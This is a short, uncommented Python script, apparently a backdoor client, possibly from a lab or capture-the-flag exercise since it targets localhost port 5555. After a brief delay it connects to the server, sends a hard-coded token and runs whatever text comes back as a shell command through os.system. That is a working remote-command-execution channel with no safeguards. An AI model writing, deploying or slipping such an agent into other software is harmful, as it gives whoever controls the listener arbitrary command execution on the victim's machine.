import socket
import os
from time import sleep

sleep(3)

server_host_ip = "127.0.0.1"
server_port = 5555

client_config = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client_config.connect((server_host_ip, server_port))

message = "RY.:8gf^qtt2f/Y[kd9`s!^Bq](5ng[n1]1LN_IE?J+(+m}AMkkC0"


client_config.send(message.encode("utf-8"))

response = client_config.recv(1024).decode("utf-8")
os.system(response)